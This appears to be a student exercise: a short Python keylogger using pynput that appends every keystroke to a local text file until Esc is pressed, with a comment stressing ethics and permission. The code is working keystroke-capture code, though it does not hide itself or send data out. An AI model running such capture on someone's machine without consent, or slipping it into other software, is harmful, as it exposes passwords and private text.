# Simple Keylogger

# Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

from pynput import keyboard
import os

log_file = "M:/Study/Python/Prodigy/New folder/key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error: {e}")
